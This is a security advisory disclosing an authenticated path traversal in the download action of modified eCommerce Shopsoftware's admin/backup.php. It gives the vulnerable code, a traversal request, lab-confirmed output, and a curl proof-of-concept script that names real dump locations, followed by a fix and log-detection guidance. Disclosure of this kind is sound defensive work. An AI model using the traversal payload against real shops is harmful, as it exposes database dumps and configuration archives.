# Security Advisory: Path Traversal in admin/backup.php — Arbitrary File Download

> **Identifier:** Pending CVE assignment
> **Publication Date:** 16/11/2026
> **Last Updated:** 16/11/2026
> **Severity:** Medium
> **CVSS:** 4.9 — `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N`
> **CWE:** CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
> **Status:** Unpatched

---

## 1. Executive Summary

modified eCommerce Shopsoftware v3.3.0 is affected by a path traversal vulnerability in `admin/backup.php`. The `download` action reads a filename from the `GET file` parameter and opens the file at an absolute path constructed by prepending the backup directory. No `..` check is performed in the `download` case (unlike the `deleteconfirm` case in the same file). An authenticated admin can download any file readable by the web server process whose name ends in `.sql`, `.zip`, or `.gz`, including database dumps, configuration files, and log files placed outside the webroot.

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---|---|---|
| modified eCommerce Shopsoftware | ≤ 3.3.0 (rev 16825) | None | Affected |
| Component: admin/backup.php | rev 16825 | None | Affected |

- **Repository / Ecosystem:** https://www.modified-shop.org
- **Evaluated stack:** PHP 8.1.34, Apache 2.4, MariaDB 10.6, Debian Linux (Docker)

---

## 3. Vulnerability Description

The `download` case in `backup.php` checks only the last 3 characters of the filename to enforce a `.sql`/`.zip`/`.gz` extension filter, then opens the file using `fopen(DIR_FS_BACKUP . $_GET['file'], 'rb')` without verifying that the resolved path stays within the backup directory. Ironically, the `deleteconfirm` case in the same switch block does include a `strpos($_GET['file'], '..')` check, confirming the developer was aware of the traversal risk but failed to apply it consistently.

**Root cause:**

```php
// admin/backup.php:89–99
case 'download':
    $extension = substr($_GET['file'], -3);
    // Extension check: only last 3 chars — ".gz", "sql", "zip"
    if (($extension == 'zip') || ($extension == '.gz') || ($extension == 'sql')) {
        if ($fp = fopen(DIR_FS_BACKUP . $_GET['file'], 'rb')) {  // ← NO .. check
            $buffer = fread($fp, filesize(DIR_FS_BACKUP . $_GET['file']));
            // ... sends buffer as download
        }
    }

// Compare: deleteconfirm DOES have the check (backup.php:~130):
case 'deleteconfirm':
    if (strpos($_GET['file'], '..') !== false) {  // ← check exists here only
        xtc_redirect(...);
    }
```

### Necessary Conditions

- **Authentication:** Admin
- **User interaction:** None
- **Attack vector:** Network
- **Preconditions:** Target file must end in `.sql`, `.zip`, or `.gz` and be readable by `www-data`

---

## 4. Impact

- **Confidentiality:** High — any `.sql`/`.zip`/`.gz` file readable by the web process can be downloaded (database dumps, configuration archives, log archives)
- **Integrity:** None
- **Availability:** None

Sensitive files at risk include off-site database backups (`.sql`), compressed configuration archives (`.zip`/`.gz`), and any tool output placed in predictable paths.

---

## 5. Classification

### CVSS

- **Score:** 4.9
- **Severity:** Medium
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N`

| Metric | Value |
|---|---|
| Attack Vector (AV) | Network |
| Attack Complexity (AC) | Low |
| Privileges Required (PR) | High |
| User Interaction (UI) | None |
| Scope (S) | Unchanged |
| Confidentiality (C) | High |
| Integrity (I) | None |
| Availability (A) | None |

### CWE

- CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

### CAPEC

- CAPEC-139: Relative Path Traversal

---

## 6. Exploitation Scenario

1. Attacker with admin credentials identifies that backup.php serves files from a fixed backup directory.
2. Attacker crafts `?action=download&file=../../../../../../tmp/database_export.sql`.
3. PHP resolves the path: `/var/www/html/admin/backups/../../../../../../tmp/database_export.sql` → `/tmp/database_export.sql`.
4. The file is served as a download to the attacker.
5. Attacker can target any file ending in `.sql`/`.zip`/`.gz` on the server: database exports created by scheduled jobs, compressed configuration backups, etc.

---

## 7. Technical Evidence

### Affected Component

```text
File(s): admin/backup.php (lines 89–99)
Parameter(s): file (GET), action=download (GET)
Method: GET · Authentication: Admin required
```

### Example Request

```http
GET /admin/backup.php?action=download&file=../../../../../../tmp/rs_traversal_test.sql HTTP/1.1
Host: TARGET
Cookie: MODsid=<ADMIN_SESSION_ID>
```

### Observed Response

```text
HTTP/1.1 200 OK
Content-Type: Application/octet-stream
Content-Disposition: attachment; filename="rs_traversal_test.sql"
Content-Length: 32

RS_BACKUP_TRAVERSAL_CONFIRMED
```

### Result

Confirmed in authorized Docker lab. File `/tmp/rs_traversal_test.sql` (placed outside webroot) was successfully downloaded via path traversal. The extension filter was satisfied by the `.sql` suffix of the filename.

**Evidence:** HTTP 200 with file contents `RS_BACKUP_TRAVERSAL_CONFIRMED` returned as download.

---

## 8. Proof of Concept

```bash
#!/bin/bash
# V06 PoC — Path Traversal in backup.php
TARGET="http://localhost:9080"
SID="<ADMIN_SESSION_ID>"
UA="Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"

# Step 1: Place a test file outside the webroot (simulate a database dump)
# (In a real attack the attacker would target an existing file)
docker exec modifiedshop_web bash -c \
  "echo 'RS_BACKUP_TRAVERSAL_CONFIRMED' > /tmp/rs_traversal_test.sql"

# Step 2: Download via path traversal
curl -v -b "MODsid=$SID" -H "User-Agent: $UA" \
  "http://TARGET/admin/backup.php?action=download&file=../../../../../../tmp/rs_traversal_test.sql"

# Output: HTTP 200 with file contents as attachment
# Real targets: /tmp/*.sql (database dumps from cron jobs), /var/backups/*.sql.gz
```

### Expected Result

```text
HTTP/1.1 200 OK
Content-Disposition: attachment; filename="rs_traversal_test.sql"

RS_BACKUP_TRAVERSAL_CONFIRMED
```

### PoC Limitations

- Does not cause service disruption.
- Does not modify or remove any data.
- Does not create persistence or backdoors.
- Does not contain real credentials.

---

## 9. Reproduction Steps

1. Deploy authorized instance. Place a `.sql` file at a path outside the webroot (e.g., `/tmp/test.sql`).
2. Log in as admin.
3. Send: `GET /admin/backup.php?action=download&file=../../../../../../tmp/test.sql`
4. Confirm the file is returned as a download.
5. Comparison: `deleteconfirm` action with the same `file` parameter returns a redirect (blocked by its `..` check).

---

## 10. Mitigation

- Add `strpos($_GET['file'], '..') !== false` check to the `download` case (same as `deleteconfirm`).
- Use `realpath()` and verify the result starts with `DIR_FS_BACKUP`.
- Strip directory separators and `..` components from the filename.

---

## 11. Fix

**No official fix as of 16/11/2026.**

```php
// Apply the same check used in deleteconfirm to the download case:
case 'download':
    if (strpos($_GET['file'], '..') !== false) {   // ← Add this check
        xtc_redirect(xtc_href_link(FILENAME_BACKUP));
        break;
    }
    $real = realpath(DIR_FS_BACKUP . $_GET['file']);
    if ($real === false || strpos($real, realpath(DIR_FS_BACKUP)) !== 0) {
        xtc_redirect(xtc_href_link(FILENAME_BACKUP));
        break;
    }
    $extension = substr($_GET['file'], -3);
    // ... rest of download logic using $real
```

---

## 12. Detection and Indicators

- GET requests to `/admin/backup.php?action=download` with `file` parameter containing `..`.
- Download of files not in the backup directory.

### Example Log Search

```text
grep "backup.php.*download" access.log | grep "\.\."
```

---

## 13. Disclosure Timeline

| Date | Event |
|---|---|
| 16/11/2026 | Identified via code review |
| 16/11/2026 | Confirmed in authorized lab |
| 16/11/2026 | Advisory prepared |
| pending | Vendor notified |
| pending | CVE requested |

---

## 14. Vendor Communication

- **Vendor / Maintainer:** modified-shop.org team
- **Channel used:** Pending
- **Response status:** Awaiting response

---

## 15. Credits

- **Researcher:** vinniboy021 (@vinniboy021)
- **Organization:** Independent security researcher
- **Contact:** vinniboy021@gmail.com / https://github.com/vinniboy021

---

## 16. References

- CWE-22: https://cwe.mitre.org/data/definitions/22.html
- CAPEC-139: https://capec.mitre.org/data/definitions/139.html
- CVSS calculator: https://www.first.org/cvss/calculator/3.1

---

## 17. Revision History

| Version | Date | Change |
|---|---|---|
| 1.0 | 16/11/2026 | Initial publication |

---

## 18. Legal Notice

This advisory is published for educational, defensive, and security improvement purposes.

---

## 19. Contact

- **Email:** vinniboy021@gmail.com
- **Repository:** https://github.com/vinniboy021/agent-cve-hunter
